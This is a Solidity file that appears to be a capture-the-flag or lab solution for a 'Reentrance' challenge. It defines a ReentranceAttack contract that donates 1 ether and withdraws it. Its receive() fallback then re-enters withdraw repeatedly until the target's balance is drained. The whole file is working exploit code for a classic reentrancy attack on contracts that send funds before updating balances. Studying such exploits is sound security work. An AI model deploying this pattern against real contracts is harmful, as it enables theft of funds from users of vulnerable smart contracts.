// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Reentrance} from "./Reentrance.sol";
import {Test, console} from "forge-std/Test.sol";


contract ReentranceAttack {
    Reentrance reentrance;

    constructor(address payable _target) payable {
        reentrance = Reentrance(_target);
    }

    receive() external payable{
        uint256 balance = address(reentrance).balance;
        if (balance >= 1 ether) {
            reentrance.withdraw(1 ether);
            return;
        }
    }

    function run() public payable {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }
}